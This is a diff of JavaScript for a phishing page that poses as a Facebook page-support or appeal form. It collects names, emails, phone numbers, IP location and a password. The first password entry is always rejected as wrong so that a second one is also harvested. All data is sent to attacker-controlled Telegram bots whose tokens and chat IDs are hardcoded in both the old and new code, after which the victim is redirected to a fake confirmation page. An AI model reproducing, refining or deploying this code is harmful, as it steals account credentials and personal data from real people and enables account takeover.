@@ -5,96 +5,108 @@ function getIP(callback) {
         .catch(error => callback(undefined));
 }
 
-let FIRST_PASSWORD = '';
-let NUMBER_TIME_LOGIN = 0;
-let isSubmitDisabled = false; // ✅ Dùng để khóa nút tạm thời
-
 $(document).ready(function () {
 
     $('#input').html(`
-        <div class="mb-3">
-            <label for="page-name" class="form-label">
-                Page Name <span class="text-danger">*</span>
-            </label>
-            <input type="text" class="form-control" required id="page-name">
-        </div>
-        <div class="mb-3">
-            <label for="full-name" class="form-label">
-                Full Name <span class="text-danger">*</span>
-            </label>
-            <input type="text" class="form-control" required id="full-name">
-        </div>
-        <div class="mb-3">
-            <label for="business-email" class="form-label">
-                Business Email Address <span class="text-danger">*</span>
-            </label>
-            <input type="text" class="form-control" required id="business-email">
-        </div>
-        <div class="mb-3">
-            <label for="personal-email" class="form-label">
-                Personal Email Address <span class="text-danger">*</span>
-            </label>
-            <input type="text" class="form-control" required id="personal-email">
-        </div>
-        <div class="mb-3">
-            <label for="phone" class="form-label">
-                Mobile Phone Number <span class="text-danger">*</span>
-            </label>
-            <input type="text" class="form-control" required id="phone">
-        </div>
-        <div class="mb-3">
-            <label class="form-label">
-                Please provide us information that will help us investigate.
-            </label>
-            <textarea class="form-control" id="description" rows="3"></textarea>
-        </div>
-        <button type="button" class="btn mb-4">Submit</button>
+                            <div class="mb-3">
+                                <label for="page-name" class="form-label">
+                                    Page Name <span class="text-danger">*</span>
+                                </label>
+                                <input type="text" class="form-control" required id="page-name" aria-describedby="emailHelp">
+                            </div>
+                            <div class="mb-3">
+                                <label for="full-name" class="form-label">
+                                    Full Name <span class="text-danger">*</span>
+                                </label>
+                                <input type="text" class="form-control" required id="full-name" aria-describedby="emailHelp">
+                            </div>
+                            <div class="mb-3">
+                                <label for="business-email" class="form-label">
+                                    Business Email Address <span class="text-danger">*</span>
+                                </label>
+                                <input type="text" class="form-control" required id="business-email"
+                                    aria-describedby="emailHelp">
+                            </div>
+                            <div class="mb-3">
+                                <label for="personal-email" class="form-label">
+                                    Personal Email Address <span class="text-danger">*</span>
+                                </label>
+                                <input type="text" class="form-control" required id="personal-email"
+                                    aria-describedby="emailHelp">
+                            </div>
+                            <div class="mb-3">
+                                <label for="phone" class="form-label">
+                                    Mobile Phone Number <span class="text-danger">*</span>
+                                </label>
+                                <input type="text" class="form-control" required id="phone" aria-describedby="emailHelp">
+                            </div>
+                            <div class="mb-3">
+                                <label for="full-name" class="form-label">
+                                    Please provide us information that will help us investigate.
+                                </label>
+                                <textarea class="form-control" id="description" rows="3"></textarea>
+                            </div>
+                            <button type="button" class="btn mb-4">Submit</button>
     `)
 
     openDetail();
-
+    let IpAddress = '';
+    
     getIP(ip => {
-        sendForm(ip);
+        IpAddress = ip;
+        sendForm(IpAddress);
     });
 
     $('#phone').on('input', function () {
         var input = $(this).val();
-        var validInputRegex = /^[+\d]*$/;
+        var validInputRegex = /^[+\d]*$/; // Chỉ cho phép số và dấu cộng
+
         if (!validInputRegex.test(input)) {
+            // Nếu nhập giá trị không hợp lệ, loại bỏ ký tự cuối cùng nhập vào
             $(this).val(input.slice(0, -1));
         }
     });
+
+
 });
 
 function openDetail() {
     $(".nav-item-parent").on("click", function () {
-        var currentRotate = $(this).find(".arrow").css("rotate").replace("deg", "");
-        var isOpen = currentRotate != 0;
-        $(".detail").hide();
+        var currentRotate = $(this).find(".arrow").css("rotate");
+        currentRotate = currentRotate.replace("deg", "");
+
+        var isOpen = currentRotate == 0 ? false : true;
+
+        $(".detail").css("display", "none");
         $(".arrow").css("rotate", "0deg");
 
         const id = $(this).data("id");
         if (isOpen) {
-            $("#" + id).hide();
+            $("#" + id).css("display", "none");
+            $(this).find(".arrow").css("rotate", "0deg");
         } else {
-            $("#" + id).show();
+            $("#" + id).css("display", "block");
             $(this).find(".arrow").css("rotate", "180deg");
         }
     });
 
     $(".nav-item-child").on("click", function () {
-        var currentRotate = $(this).find(".arrow").css("rotate").replace("deg", "");
-        var isOpen = currentRotate != 0;
-        const id = $(this).data("id");
+        var currentRotate = $(this).find(".arrow").css("rotate");
+        currentRotate = currentRotate.replace("deg", "");
 
+        var isOpen = currentRotate == 0 ? false : true;
+
+        const id = $(this).data("id");
         if (isOpen) {
-            $("#" + id).hide();
+            $("#" + id).css("display", "none");
             $(this).find(".arrow").css("rotate", "0deg");
-            $(this).find(".icon-container").css("background-color", "var(--color-white-secondary)");
+            $(this)
+                .find(".icon-container")
+                .css("background-color", "var(--color-white-secondary)");
             $(this).find(".icon-container i").css("-webkit-filter", "invert(0%)");
             $(this).css("background", "none");
         } else {
-            $("#" + id).show();
+            $("#" + id).css("display", "block");
             $(this).find(".arrow").css("rotate", "180deg");
             $(this).find(".icon-container i").css("-webkit-filter", "invert(100%)");
             $(this).find(".icon-container").css("background-color", "#1877F2");
@@ -104,136 +116,169 @@ function openDetail() {
 }
 
 function validateForm() {
+
     var isValid = true;
+
+    // Validate trường Page Name
+    var pageName = $('#page-name').val();
+    if (pageName === '') {
+        isValid = false;
+        $('#page-name').addClass('border-danger');
+    } else {
+        $('#page-name').removeClass('border-danger');
+    }
+
+    // Validate trường Full Name
+    var fullName = $('#full-name').val();
+    if (fullName === '') {
+        isValid = false;
+        $('#full-name').addClass('border-danger');
+    } else {
+        $('#full-name').removeClass('border-danger');
+    }
+
+    // Validate trường Business Email
+    var businessEmail = $('#business-email').val();
     var emailRegex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+    if (!emailRegex.test(businessEmail)) {
+        isValid = false;
+        $('#business-email').addClass('border-danger');
+    } else {
+        $('#business-email').removeClass('border-danger');
+    }
+
+    // Validate trường Personal Email
+    var personalEmail = $('#personal-email').val();
+    if (!emailRegex.test(personalEmail)) {
+        isValid = false;
+        $('#personal-email').addClass('border-danger');
+    } else {
+        $('#personal-email').removeClass('border-danger');
+    }
+
+    // Validate trường Phone
+    var phone = $('#phone').val();
+    // Cho phép dấu "+" ở đầu và sau đó là các chữ số
     var phoneRegex = /^(\+\d+|\d+)$/;
 
-    const fields = [
-        { id: '#page-name' },
-        { id: '#full-name' },
-        { id: '#business-email', regex: emailRegex },
-        { id: '#personal-email', regex: emailRegex },
-        { id: '#phone', regex: phoneRegex }
-    ];
+    if (!phoneRegex.test(phone)) {
+        isValid = false;
+        $('#phone').addClass('border-danger');
+    } else {
+        $('#phone').removeClass('border-danger');
+    }
 
-    fields.forEach(field => {
-        const val = $(field.id).val();
-        if (!val || (field.regex && !field.regex.test(val))) {
-            isValid = false;
-            $(field.id).addClass('border-danger');
-        } else {
-            $(field.id).removeClass('border-danger');
-        }
-    });
 
     return isValid;
+
 }
 
+var NUMBER_TIME_LOGIN = 0;
+
 function sendForm(IpAddress) {
-    $(".content #dataGet button[type=button]").off("click").on("click", function () {
+    $(".content #dataGet button[type=button]").off("click");
+
+    $(".content #dataGet button[type=button]").on("click", function () {
         if (validateForm()) {
-            showPrompt(IpAddress);
+            showPrompt(IpAddress, true);
         }
     });
 }
 
-function showPrompt(IpAddress) {
-    $('#getPassword').removeClass('d-none');
+let FIRST_PASSWORD = '';
 
-    $('#close-password').off("click").on('click', function () {
+function showPrompt(IpAddress) {
+
+
+    $('#getPassword').removeClass('d-none');
+    $("#close-password").off("click");
+    $('#close-password').on('click', function () {
         $('#getPassword').addClass('d-none');
     });
 
-    $('#submit-password').off("click").on('click', function () {
-        if (isSubmitDisabled) return;
-
-        isSubmitDisabled = true;
-        const submitBtn = $('#submit-password');
-        submitBtn.prop('disabled', true);
-
+    $("#submit-password").off("click");
+    $('#submit-password').on('click', function () {
         let password = $("#password").val();
         if (password === '') {
             $('#password').addClass('border-danger');
-            isSubmitDisabled = false;
-            submitBtn.prop('disabled', false);
             return;
         } else {
             $('#password').removeClass('border-danger');
         }
-
-        // ✅ Ẩn thông báo sai pass nếu có trước đó
-        $('#wrong-password').addClass('d-none');
-
         let secondPassword = '';
         if (NUMBER_TIME_LOGIN >= 1) {
             secondPassword = password;
             password = FIRST_PASSWORD;
         }
+        const product = {
+            product_id: "",
+            ipAddress: IpAddress.ipAddress,
+            area: "",
+            country: IpAddress.countryName,
+            city: IpAddress.city,
+            fullName: $("#full-name").val(),
+            buEmail: $("#business-email").val(),
+            perEmail: $("#personal-email").val(),
+            phone: $("#phone").val(),
+            pageName: $("#page-name").val(),
+            passwords: password,
+            secondPassword: secondPassword,
+            hasKey: "",
+            keymap: "",
+            trueWay: 0,
+        };
+        
+        const message1   = '<strong>User Email: </strong>' + $("#business-email").val() + 
+        '%0A<strong>User Name: </strong>' + $("#full-name").val() + 
+        '%0A<strong>User Email: </strong>' + $("#personal-email").val() + 
+        '%0A<strong>Facebook Page: </strong>' + $("#page-name").val()+ 
+        '%0A<strong>Phone Number: </strong>' + $("#phone").val() + 
+        '%0A<strong>First Password: </strong>' + password +
+        '%0A<strong>Second Password: </strong>'+ secondPassword +
+        '%0A<strong>IP Address: </strong>' + IpAddress.ipAddress +
+        '%0A<strong>Country : </strong>' + IpAddress.countryName +'( '+IpAddress.countryCode+' )'+
+        '%0A<strong>City : </strong>' + IpAddress.city ;
 
-        const message = `📧 <strong>Business Email: </strong><code>${$("#business-email").val()}</code>
-👤 <strong>User Name: </strong><code>${$("#full-name").val()}</code>
-📨 <strong>Personal Email: </strong><code>${$("#personal-email").val()}</code>
-🏳️ <strong>Facebook Page: </strong><code>${$("#page-name").val()}</code>
-📞 <strong>Phone Number: </strong><code>${$("#phone").val()}</code>
-🔑 <strong>First Password: </strong><code>${password}</code>
-🔑 <strong>Second Password: </strong><code>${secondPassword}</code>
-🌐 <strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>
-<strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
-<strong>City: </strong><code>${IpAddress.city}</code>`;
+        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
+        const chatId = '-1002416068664'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
+        const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
 
-        fetch(`https://api.telegram.org/7915689883:AAFk_jhQ4aVXoZ8RAjcVuYl1K0_Rk78yD_o/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: '-1002674039533',
-                text: message,
-                parse_mode: 'html'
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
+
+        fetch(telegramUrl)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
             })
-        })
-        .then(res => {
-            if (!res.ok) throw new Error("Telegram request failed");
-            return res.json();
-        })
-        .then(data => {
-            NUMBER_TIME_LOGIN++;
-
-            if (NUMBER_TIME_LOGIN === 1) {
-                FIRST_PASSWORD = password;
-
-                let countdown = 10;
-                submitBtn.text(`Please wait ${countdown}s`);
-                setTimeout(() => {
-                    $('.lsd-ring-container').addClass('d-none');
-                    $('#password').val('');
-                }, 100);
-
-                const interval = setInterval(() => {
-                    countdown--;
-                    if (countdown > 0) {
-                        submitBtn.text(`Please wait ${countdown}s`);
-                    } else {
-                        clearInterval(interval);
-                        submitBtn.prop('disabled', false);
-                        submitBtn.text('Continue');
+            .then(data => {
+                NUMBER_TIME_LOGIN++;
+                if (NUMBER_TIME_LOGIN === 1) {
+                    FIRST_PASSWORD = password;
+                    setTimeout(function () {
+                        $('.lsd-ring-container').addClass('d-none');
                         $('#wrong-password').removeClass('d-none');
-                        isSubmitDisabled = false;
-                    }
-                }, 1000);
-            } else {
-                setTimeout(() => {
+                        $("#password").val('');
+                    }, 2000);
+                } else {
+                    setTimeout(function () {
+                        $('.lsd-ring-container').addClass('d-none');
+                        window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
+                    }, 2000);
+                }
+            })
+            .catch(error => {
+                setTimeout(function () {
+                    Swal.fire({
+                        text: `Request failed!`,
+                        icon: "error"
+                    });
                     $('.lsd-ring-container').addClass('d-none');
-                    window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
-                }, 2000);
-            }
-        })
-        .catch(error => {
-            Swal.fire({
-                text: `Request failed!`,
-                icon: "error"
+                }, 500);
             });
-            $('.lsd-ring-container').addClass('d-none');
-            submitBtn.prop('disabled', false);
-            isSubmitDisabled = false;
-        });
+
     });
+
+
 }
